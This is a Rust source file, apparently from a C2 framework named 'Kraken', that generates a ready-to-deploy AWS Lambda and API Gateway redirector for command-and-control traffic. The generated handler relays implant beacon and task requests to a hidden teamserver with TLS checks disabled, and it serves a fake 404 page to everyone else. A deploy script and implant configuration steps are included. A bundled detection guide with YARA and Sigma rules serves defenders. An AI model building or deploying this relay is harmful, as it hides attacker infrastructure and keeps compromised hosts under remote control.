//! AWS Lambda Function URL Redirector
//!
//! Generates AWS Lambda + API Gateway deployment configuration for C2 traffic relay.
//! This enables serverless traffic filtering and relay through AWS infrastructure.
//!
//! # Architecture
//!
//! ```text
//! Implant → API Gateway → Lambda Function → Teamserver
//!           (public URL)   (filter+proxy)    (hidden backend)
//! ```
//!
//! # Detection Indicators
//! - API Gateway URL patterns (predictable format)
//! - CloudWatch logs showing request patterns
//! - Lambda execution logs with unusual payload patterns
//! - Consistent execution timing (cold starts visible)
//! - X-Forwarded-For headers revealing backend IPs
//!
//! # MITRE ATT&CK
//! - T1090.001 (Proxy: Proxy)
//! - T1071.001 (Application Layer Protocol: Web Protocols)

use anyhow::Result;
use clap::Args;
use std::fs;
use std::path::Path;

/// Arguments for Lambda redirector generation
#[derive(Debug, Args)]
pub struct LambdaRedirectorArgs {
    /// Backend teamserver IP or hostname
    #[arg(long, short = 'b')]
    pub backend_host: String,

    /// Backend port (default 8443)
    #[arg(long, default_value = "8443")]
    pub backend_port: u16,

    /// API Gateway name (default "kraken-relay")
    #[arg(long, default_value = "kraken-relay")]
    pub api_name: String,

    /// AWS region (default "us-east-1")
    #[arg(long, default_value = "us-east-1")]
    pub region: String,

    /// Allowed URI paths (comma-separated, e.g., "/api/v1/beacon,/api/v1/task")
    #[arg(long, default_value = "/api/v1/beacon,/api/v1/task")]
    pub allowed_paths: String,

    /// Output directory for generated files
    #[arg(long, short = 'o', default_value = "./lambda-redirector")]
    pub output_dir: String,

    /// Optional C2 profile for URI matching (for future profile parsing)
    #[arg(long)]
    pub profile_path: Option<String>,

    /// Function timeout in seconds (default 30)
    #[arg(long, default_value = "30")]
    pub timeout: u32,

    /// Memory allocation in MB (default 256)
    #[arg(long, default_value = "256")]
    pub memory_size: u32,
}

/// Generate AWS Lambda redirector deployment files
pub fn generate_lambda_redirector(args: LambdaRedirectorArgs) -> Result<()> {
    let output_path = Path::new(&args.output_dir);
    fs::create_dir_all(output_path)?;

    // Generate Lambda handler code
    let handler_code = generate_handler_code(&args);
    fs::write(output_path.join("handler.py"), &handler_code)?;

    // Generate SAM template
    let sam_template = generate_sam_template(&args);
    fs::write(output_path.join("template.yaml"), &sam_template)?;

    // Generate requirements.txt
    let requirements = generate_requirements();
    fs::write(output_path.join("requirements.txt"), &requirements)?;

    // Generate deployment script
    let deploy_script = generate_deploy_script(&args);
    fs::write(output_path.join("deploy.sh"), &deploy_script)?;

    // Generate README
    let readme = generate_lambda_readme(&args);
    fs::write(output_path.join("README.md"), &readme)?;

    // Generate detection documentation
    let detection_doc = generate_lambda_detection_doc(&args);
    fs::write(output_path.join("DETECTION.md"), &detection_doc)?;

    // Generate environment config example
    let env_config = generate_env_config(&args);
    fs::write(output_path.join(".env.example"), &env_config)?;

    println!("[+] Lambda redirector files generated in: {}", args.output_dir);
    println!("    - handler.py       (Lambda function code)");
    println!("    - template.yaml    (SAM template)");
    println!("    - requirements.txt (Python dependencies)");
    println!("    - deploy.sh        (Deployment script)");
    println!("    - README.md        (Deployment guide)");
    println!("    - DETECTION.md     (Detection indicators)");
    println!("    - .env.example     (Environment config)");
    println!();
    println!("[*] Deploy with:");
    println!("    cd {} && bash deploy.sh", args.output_dir);

    Ok(())
}

fn generate_handler_code(args: &LambdaRedirectorArgs) -> String {
    let allowed_paths_list = args
        .allowed_paths
        .split(',')
        .map(|p| format!("    \"{}\"", p.trim()))
        .collect::<Vec<_>>()
        .join(",\n");

    let decoy_html = r#"<html>
<head><title>404 Not Found</title></head>
<body><h1>404 Not Found</h1><p>The requested resource was not found.</p></body>
</html>"#;

    format!(
        r#"import json
import urllib3
import os
import logging
from urllib.parse import urlparse, quote

logger = logging.getLogger()
logger.setLevel(logging.INFO)

# Configuration from environment
BACKEND_HOST = os.environ.get('BACKEND_HOST', '{}')
BACKEND_PORT = int(os.environ.get('BACKEND_PORT', '{}'))
ALLOWED_PATHS = [
{}
]

# Construct backend URL
BACKEND_URL = f"https://{{BACKEND_HOST}}:{{BACKEND_PORT}}"

# Disable SSL verification for self-signed certs (optional)
http = urllib3.PoolManager(
    cert_reqs='CERT_NONE',
    ssl_version=urllib3.util.ssl_.PROTOCOL_TLSv1_2,
    num_pools=10,
    maxsize=10,
    timeout=urllib3.Timeout(connect=5.0, read=25.0)
)

DECOY_HTML = {}


def handler(event, context):
    """
    Lambda handler for C2 redirector.

    Relays allowed paths to backend teamserver.
    Returns decoy content for disallowed paths.
    """
    try:
        # Extract request details
        path = event.get('rawPath', '/')
        method = event.get('requestContext', {{}}).get('http', {{}}).get('method', 'GET')
        headers = event.get('headers', {{}})
        body = event.get('body', '')
        query_string = event.get('rawQueryString', '')

        logger.info(f"Request: {{method}} {{path}} from {{headers.get('x-forwarded-for', 'unknown')}}")

        # Check if path is allowed
        path_allowed = any(path.startswith(allowed) for allowed in ALLOWED_PATHS)
        if not path_allowed:
            logger.warning(f"Blocked request to disallowed path: {{path}}")
            return {{
                'statusCode': 200,
                'body': DECOY_HTML,
                'headers': {{'Content-Type': 'text/html'}},
                'isBase64Encoded': False
            }}

        # Build backend URL with query string
        backend_url = BACKEND_URL + path
        if query_string:
            backend_url += '?' + query_string

        logger.info(f"Forwarding to backend: {{backend_url}}")

        # Filter headers (remove host and x-forwarded-* to avoid conflicts)
        filtered_headers = {{}}
        skip_headers = {{'host', 'x-forwarded-for', 'x-forwarded-host', 'x-forwarded-proto', 'x-amzn-trace-id'}}
        for key, value in headers.items():
            if key.lower() not in skip_headers:
                filtered_headers[key] = value

        # Add forwarded information
        client_ip = headers.get('x-forwarded-for', 'unknown').split(',')[0].strip()
        filtered_headers['X-Forwarded-For'] = client_ip
        filtered_headers['X-Forwarded-Proto'] = 'https'

        # Forward request to backend
        try:
            if method.upper() in ['POST', 'PUT', 'PATCH']:
                response = http.request(
                    method,
                    backend_url,
                    headers=filtered_headers,
                    body=body if body else None
                )
            else:
                response = http.request(
                    method,
                    backend_url,
                    headers=filtered_headers
                )

            # Decode response body
            response_body = response.data.decode('utf-8', errors='replace')

            # Extract response headers
            response_headers = dict(response.headers)

            logger.info(f"Backend response: {{response.status}}")

            return {{
                'statusCode': response.status,
                'body': response_body,
                'headers': response_headers,
                'isBase64Encoded': False
            }}

        except Exception as e:
            logger.error(f"Backend request failed: {{str(e)}}")
            return {{
                'statusCode': 503,
                'body': json.dumps({{'error': 'Service Unavailable'}}),
                'headers': {{'Content-Type': 'application/json'}},
                'isBase64Encoded': False
            }}

    except Exception as e:
        logger.error(f"Handler error: {{str(e)}}")
        return {{
            'statusCode': 500,
            'body': json.dumps({{'error': 'Internal Server Error'}}),
            'headers': {{'Content-Type': 'application/json'}},
            'isBase64Encoded': False
        }}
"#,
        args.backend_host,
        args.backend_port,
        allowed_paths_list,
        format!("r#\"{}\"#", decoy_html.replace("\"", "\\\""))
    )
}

fn generate_sam_template(args: &LambdaRedirectorArgs) -> String {
    format!(
        r#"AWSTemplateFormatVersion: '2010-09-09'
Transform: AWS::Serverless-2016-10-31

Description: |
  Kraken C2 Lambda Redirector
  Serverless traffic relay for C2 communication through AWS Lambda and API Gateway

Parameters:
  BackendHost:
    Type: String
    Default: {}
    Description: Backend teamserver IP or hostname

  BackendPort:
    Type: Number
    Default: {}
    Description: Backend teamserver port

Globals:
  Function:
    Timeout: {}
    MemorySize: {}
    Runtime: python3.11
    Architectures:
      - x86_64
    Environment:
      Variables:
        BACKEND_HOST: !Ref BackendHost
        BACKEND_PORT: !Ref BackendPort

Resources:
  RelayFunction:
    Type: AWS::Serverless::Function
    Properties:
      FunctionName: !Sub '${{AWS::StackName}}-relay'
      CodeUri: .
      Handler: handler.handler
      ReservedConcurrentExecutions: 100
      EphemeralStorage:
        Size: 512
      Events:
        CatchAllApi:
          Type: Api
          Properties:
            Path: '/{{\*proxy}}'
            Method: ANY
            RestApiId: !Ref RelayApi
      Policies:
        - Version: '2012-10-17'
          Statement:
            - Effect: Allow
              Action:
                - logs:CreateLogGroup
                - logs:CreateLogStream
                - logs:PutLogEvents
              Resource: arn:aws:logs:*:*:*

  RelayApi:
    Type: AWS::Serverless::Api
    Properties:
      Name: {}
      StageName: prod
      TracingEnabled: false
      MethodSettings:
        - ResourcePath: '/*'
          HttpMethod: '*'
          MetricsEnabled: true
          DataTraceEnabled: false
          LoggingLevel: INFO

Outputs:
  RelayFunctionArn:
    Description: ARN of the Lambda relay function
    Value: !GetAtt RelayFunction.Arn

  RelayFunctionName:
    Description: Name of the Lambda relay function
    Value: !Ref RelayFunction

  ApiEndpoint:
    Description: API Gateway endpoint URL
    Value: !Sub 'https://${{RelayApi}}.execute-api.${{AWS::Region}}.amazonaws.com/prod'

  ApiId:
    Description: API Gateway ID
    Value: !Ref RelayApi
"#,
        args.backend_host, args.backend_port, args.timeout, args.memory_size, args.api_name
    )
}

fn generate_requirements() -> String {
    r#"urllib3>=2.0.0
"#
    .to_string()
}

fn generate_deploy_script(args: &LambdaRedirectorArgs) -> String {
    format!(
        r#"#!/bin/bash
set -e

# Kraken C2 Lambda Redirector Deployment Script

STACK_NAME="{}"
REGION="{}"
BACKEND_HOST="{}"
BACKEND_PORT={}

echo "[*] Deploying Kraken Lambda Redirector..."
echo "[*] Stack: $STACK_NAME"
echo "[*] Region: $REGION"
echo "[*] Backend: $BACKEND_HOST:$BACKEND_PORT"
echo ""

# Check prerequisites
if ! command -v aws &> /dev/null; then
    echo "[-] AWS CLI not found. Install from: https://aws.amazon.com/cli/"
    exit 1
fi

if ! command -v sam &> /dev/null; then
    echo "[-] AWS SAM CLI not found. Install from: https://aws.amazon.com/serverless/sam/"
    exit 1
fi

# Validate AWS credentials
echo "[*] Validating AWS credentials..."
aws sts get-caller-identity --region "$REGION" > /dev/null || {{
    echo "[-] Invalid AWS credentials"
    exit 1
}}

# Build and package
echo "[*] Building Lambda package..."
sam build --use-container

# Deploy
echo "[*] Deploying to AWS..."
sam deploy \
    --stack-name "$STACK_NAME" \
    --region "$REGION" \
    --parameter-overrides \
        BackendHost="$BACKEND_HOST" \
        BackendPort="$BACKEND_PORT" \
    --capabilities CAPABILITY_IAM \
    --no-fail-on-empty-changeset

echo ""
echo "[+] Deployment complete!"
echo ""
echo "[*] Get endpoint URL with:"
echo "    aws cloudformation describe-stacks --stack-name $STACK_NAME --region $REGION --query 'Stacks[0].Outputs[?OutputKey==\`ApiEndpoint\`].OutputValue' --output text"
echo ""
echo "[*] View logs with:"
echo "    sam logs -n RelayFunction --stack-name $STACK_NAME --region $REGION -t"
"#,
        args.api_name, args.region, args.backend_host, args.backend_port
    )
}

fn generate_lambda_readme(args: &LambdaRedirectorArgs) -> String {
    format!(
        r#"# Kraken AWS Lambda Redirector

Serverless traffic relay for C2 communication through AWS Lambda and API Gateway.

## Prerequisites

1. AWS Account with appropriate permissions (Lambda, API Gateway, CloudFormation)
2. AWS CLI: `curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip" && unzip awscliv2.zip && sudo ./aws/install`
3. AWS SAM CLI: `pip install aws-sam-cli`
4. Docker (for building Lambda package with dependencies)

## Configuration

Edit parameters in `deploy.sh`:
- `STACK_NAME`: CloudFormation stack name (default: "kraken-relay")
- `REGION`: AWS region (default: "{}")
- `BACKEND_HOST`: Teamserver IP/hostname ({})
- `BACKEND_PORT`: Teamserver port ({})

Or pass parameters at deploy time:
```bash
sam deploy --parameter-overrides BackendHost=10.0.0.1 BackendPort=8443
```

## Deployment

### Option 1: Automated Deployment Script

```bash
# Make script executable
chmod +x deploy.sh

# Deploy with default parameters
./deploy.sh

# Or with custom parameters
BACKEND_HOST=ts.example.com BACKEND_PORT=8443 bash deploy.sh
```

### Option 2: Manual SAM Deployment

```bash
# Build the function
sam build

# Deploy with guided setup
sam deploy --guided

# Or deploy to existing stack
sam deploy --stack-name kraken-relay --region us-east-1
```

## Getting the Endpoint

After deployment, retrieve the API endpoint:

```bash
STACK_NAME="kraken-relay"
REGION="us-east-1"

aws cloudformation describe-stacks \
  --stack-name $STACK_NAME \
  --region $REGION \
  --query 'Stacks[0].Outputs[?OutputKey==`ApiEndpoint`].OutputValue' \
  --output text
```

Example output: `https://abc123def456.execute-api.us-east-1.amazonaws.com/prod`

## Implant Configuration

Configure your implant to use the API endpoint:

```
C2_SERVER=https://abc123def456.execute-api.us-east-1.amazonaws.com/prod
C2_PATHS=/api/v1/beacon,/api/v1/task
```

## Monitoring

### CloudWatch Logs

View Lambda logs in real-time:

```bash
sam logs -n RelayFunction --stack-name kraken-relay --region us-east-1 -t
```

### CloudWatch Metrics

Monitor from AWS Console:
1. CloudWatch → Log Groups → `/aws/lambda/kraken-relay-relay`
2. CloudWatch → Metrics → Lambda → Function Metrics

### Custom Metrics

Add custom CloudWatch metrics to Lambda:

```python
from aws_lambda_powertools.metrics import Metrics

metrics = Metrics()
metrics.add_metric(name="C2Requests", unit="Count", value=1)
metrics.flush()
```

## Cleanup

Remove the deployed stack:

```bash
aws cloudformation delete-stack \
  --stack-name kraken-relay \
  --region us-east-1

# Wait for deletion
aws cloudformation wait stack-delete-complete \
  --stack-name kraken-relay \
  --region us-east-1
```

## Security Considerations

1. **IAM Permissions**: Restrict Lambda execution role to minimum required
2. **Backend Security**: Use mTLS between Lambda and teamserver
3. **Logging**: Disable CloudWatch logs in production or use encryption
4. **VPC**: Consider running Lambda in VPC with endpoints to reduce data exfiltration risk
5. **Concurrent Execution**: Set reserved concurrency to limit blast radius

## Troubleshooting

### Lambda Function Fails to Connect

- Check backend hostname/IP and port in environment variables
- Verify security groups allow egress on backend port
- Check network ACLs if using VPC

### High Latency

- Cold start latency: ~1-2 seconds for first request
- Provision reserved concurrency: `sam deploy --parameter-overrides ReservedConcurrentExecutions=10`
- Use Lambda power tuning: https://github.com/alexcasalboni/aws-lambda-power-tuning

### API Gateway Timeout

- Lambda timeout is set to {} seconds
- API Gateway timeout is 30 seconds (AWS limit)
- Increase Lambda timeout if backend is slow

## Detection

See `DETECTION.md` for indicators defenders can use to identify this traffic.

## References

- [AWS Lambda Function URLs](https://docs.aws.amazon.com/lambda/latest/dg/lambda-api.html)
- [SAM CLI Reference](https://docs.aws.amazon.com/serverless-application-model/latest/developerguide/serverless-sam-reference.html)
- [API Gateway Throttling](https://docs.aws.amazon.com/apigateway/latest/developerguide/api-gateway-request-throttling.html)
"#,
        args.region, args.backend_host, args.backend_port, args.timeout
    )
}

fn generate_lambda_detection_doc(_args: &LambdaRedirectorArgs) -> String {
    r#"# Detection Indicators for AWS Lambda Redirector

This document provides detection guidance for defenders.

## MITRE ATT&CK

- **T1090.001**: Proxy: Proxy
- **T1071.001**: Application Layer Protocol: Web Protocols
- **T1570**: Lateral Tool Transfer (if used for inter-stage relay)

## Network Indicators

### API Gateway Endpoints

Lambda redirectors use predictable AWS API Gateway URLs:

```
https://<api-id>.execute-api.<region>.amazonaws.com/<stage>/<path>
```

Example: `https://abc123def456.execute-api.us-east-1.amazonaws.com/prod/api/v1/beacon`

### CloudFlare DNS Analysis

Lambda endpoints often follow patterns:
- Registered recently (WHOIS)
- Few historical DNS records
- Resolves to AWS IP ranges

Check against: https://docs.aws.amazon.com/general/latest/gr/aws-ip-ranges.html

## Endpoint Indicators

| Indicator | Description |
|-----------|-------------|
| Connection to `.execute-api.*.amazonaws.com` | Lambda API Gateway endpoints |
| TLS SNI: `*.execute-api.*.amazonaws.com` | AWS-issued certificates |
| Certificate validity | Recently issued (usually) |
| Certificate issuer | Amazon/AWS |

## Log Analysis

### CloudWatch Logs

AWS Lambda execution logs contain:

```
[timestamp] request_id: path=/api/v1/beacon method=POST from=192.168.1.1
[timestamp] request_id: Forwarding to backend: https://ts.internal:8443/api/v1/beacon
[timestamp] request_id: Backend response: 200
```

Indicators:
- Repeated requests to same paths
- Consistent timing patterns
- X-Forwarded-For leaking internal IPs
- POST requests with encoded bodies

### API Gateway Logs

Enable API Gateway execution logs to capture:
- Request/response payloads
- Integration latency
- Throttling events

Example log format:
```
requestId: abc-123
ip: 1.2.3.4
requestTime: 09/15/2022:12:34:56 +0000
httpMethod: POST
resourcePath: /{proxy+}
status: 200
protocol: HTTP/1.1
responseLength: 512
```

## Infrastructure Indicators

### AWS Account Compromise

If internal actor has AWS access, look for:
- New Lambda functions created
- New API Gateway deployments
- New IAM roles with unusual permissions
- CloudFormation stacks created outside normal deployment process

### Cost Anomalies

- Unexpected Lambda invocation charges
- High data transfer costs (request relaying)
- Unusual API Gateway request patterns

## Behavioral Indicators

| Indicator | Description |
|-----------|-------------|
| Heartbeat pattern | Regular requests to API Gateway endpoint |
| POST body encoding | Base64 or custom encoding in payloads |
| User-Agent | Static or unusual (common in C2) |
| Referer header | Missing or spoofed |
| Accept-Language | Missing or incorrect |
| Beacon timing | Regular intervals (seconds to minutes) |

## YARA Rules

```yara
rule Lambda_C2_Beacon {
    meta:
        description = "Detects Lambda API Gateway C2 beacon"
        mitre = "T1090.001"

    strings:
        $endpoint = /https:\/\/[a-z0-9]{10,}\.(execute-api|apigateway)\.(us|eu|ap|ca|sa|me)-[a-z]+-\d\.(amazonaws\.com|aws\.com)/ ascii wide
        $path1 = "/api/v1/beacon" ascii wide
        $path2 = "/api/v1/task" ascii wide

    condition:
        $endpoint and 1 of ($path*)
}
```

## Sigma Rules

```yaml
title: AWS Lambda API Gateway C2 Beacon
status: experimental
description: Detects potential C2 beaconing to AWS Lambda API Gateway endpoints
logsource:
    category: proxy
    product: network_traffic
detection:
    selection:
        cs-host|regex: '\.execute-api\..*\.amazonaws\.com'
        cs-method: 'POST'
    filter:
        cs-uri-path|in:
            - '/api/v1/beacon'
            - '/api/v1/task'
    condition: selection and filter
level: medium
tags:
    - attack.command_and_control
    - attack.t1090.001
```

## Investigation Steps

### 1. Identify API Gateway Endpoint

Find suspicious endpoints in traffic/DNS logs:
```
dns query to *.execute-api.us-east-1.amazonaws.com
```

### 2. Check Certificate

```bash
openssl s_client -connect abc123def456.execute-api.us-east-1.amazonaws.com:443 -showcerts
```

Look for:
- Issued by Amazon
- Wildcard or specific domain
- Recent issue date

### 3. Review CloudWatch Logs

If you have AWS access:

```bash
# List all Lambda functions
aws lambda list-functions --region us-east-1

# Get function details
aws lambda get-function --function-name kraken-relay-relay

# View recent invocations
aws logs filter-log-events \
  --log-group-name /aws/lambda/kraken-relay-relay \
  --start-time $(date -d '1 hour ago' +%s)000
```

### 4. Check Route 53/DNS

Look for:
- DNS queries to API Gateway endpoints
- Frequency and timing patterns
- Correlation with command execution

## Mitigation Recommendations

1. **Block AWS Lambda API Gateway domains** if not required
   ```
   *.execute-api.*.amazonaws.com
   ```

2. **Monitor CloudWatch Logs** for suspicious patterns
3. **Alert on high Lambda invocation rates** from internal hosts
4. **Restrict Lambda IAM permissions** in security policies
5. **Implement egress filtering** to AWS IP ranges for critical hosts
6. **Monitor AWS CloudTrail** for Lambda/API Gateway API calls
7. **Require MFA** for AWS API changes

## References

- [AWS Lambda Detection](https://docs.aws.amazon.com/lambda/latest/dg/monitoring-cloudwatchlogs.html)
- [CloudWatch Logs Insights Queries](https://docs.aws.amazon.com/AmazonCloudWatch/latest/logs/CWL_QuerySyntax.html)
- [AWS IP Ranges](https://docs.aws.amazon.com/general/latest/gr/aws-ip-ranges.html)
"#.to_string()
}

fn generate_env_config(args: &LambdaRedirectorArgs) -> String {
    format!(
        r#"# AWS Lambda Redirector Environment Configuration
# Copy to .env and populate with your values

# Backend Configuration
BACKEND_HOST={}
BACKEND_PORT={}

# AWS Configuration
AWS_REGION={}
AWS_PROFILE=default

# Lambda Configuration
STACK_NAME={}
FUNCTION_NAME=kraken-relay-relay
MEMORY_SIZE={}
TIMEOUT={}

# API Gateway Configuration
API_NAME={}

# Allowed Paths (comma-separated)
ALLOWED_PATHS={}

# Optional: C2 Profile Path
# PROFILE_PATH=/path/to/profile.yaml
"#,
        args.backend_host,
        args.backend_port,
        args.region,
        args.api_name,
        args.memory_size,
        args.timeout,
        args.api_name,
        args.allowed_paths
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_lambda_args_defaults() {
        let args = LambdaRedirectorArgs {
            backend_host: "10.0.0.1".to_string(),
            backend_port: 8443,
            api_name: "kraken-relay".to_string(),
            region: "us-east-1".to_string(),
            allowed_paths: "/api/v1/beacon,/api/v1/task".to_string(),
            output_dir: "/tmp/test".to_string(),
            profile_path: None,
            timeout: 30,
            memory_size: 256,
        };

        assert_eq!(args.backend_port, 8443);
        assert_eq!(args.timeout, 30);
        assert_eq!(args.memory_size, 256);
    }

    #[test]
    fn test_handler_code_generation() {
        let args = LambdaRedirectorArgs {
            backend_host: "ts.example.com".to_string(),
            backend_port: 8443,
            api_name: "kraken-relay".to_string(),
            region: "us-east-1".to_string(),
            allowed_paths: "/api/v1/beacon,/api/v1/task".to_string(),
            output_dir: "/tmp/test".to_string(),
            profile_path: None,
            timeout: 30,
            memory_size: 256,
        };

        let code = generate_handler_code(&args);
        assert!(code.contains("BACKEND_HOST"));
        assert!(code.contains("BACKEND_PORT"));
        assert!(code.contains("/api/v1/beacon"));
        assert!(code.contains("urllib3"));
        assert!(code.contains("def handler(event, context)"));
    }

    #[test]
    fn test_sam_template_generation() {
        let args = LambdaRedirectorArgs {
            backend_host: "10.0.0.1".to_string(),
            backend_port: 9443,
            api_name: "test-relay".to_string(),
            region: "eu-west-1".to_string(),
            allowed_paths: "/beacon".to_string(),
            output_dir: "/tmp/test".to_string(),
            profile_path: None,
            timeout: 45,
            memory_size: 512,
        };

        let template = generate_sam_template(&args);
        assert!(template.contains("AWSTemplateFormatVersion"));
        assert!(template.contains("AWS::Serverless::Function"));
        assert!(template.contains("10.0.0.1"));
        assert!(template.contains("9443"));
        assert!(template.contains("test-relay"));
    }

    #[test]
    fn test_deploy_script_generation() {
        let args = LambdaRedirectorArgs {
            backend_host: "backend.internal".to_string(),
            backend_port: 8443,
            api_name: "kraken-relay".to_string(),
            region: "us-west-2".to_string(),
            allowed_paths: "/api".to_string(),
            output_dir: "/tmp/test".to_string(),
            profile_path: None,
            timeout: 30,
            memory_size: 256,
        };

        let script = generate_deploy_script(&args);
        assert!(script.contains("#!/bin/bash"));
        assert!(script.contains("backend.internal"));
        assert!(script.contains("us-west-2"));
        assert!(script.contains("sam build"));
        assert!(script.contains("sam deploy"));
    }

    #[test]
    fn test_allowed_paths_in_handler() {
        let args = LambdaRedirectorArgs {
            backend_host: "10.0.0.1".to_string(),
            backend_port: 8443,
            api_name: "relay".to_string(),
            region: "us-east-1".to_string(),
            allowed_paths: "/check,/task,/beacon".to_string(),
            output_dir: "/tmp/test".to_string(),
            profile_path: None,
            timeout: 30,
            memory_size: 256,
        };

        let code = generate_handler_code(&args);
        assert!(code.contains("\"/check\""));
        assert!(code.contains("\"/task\""));
        assert!(code.contains("\"/beacon\""));
    }
}
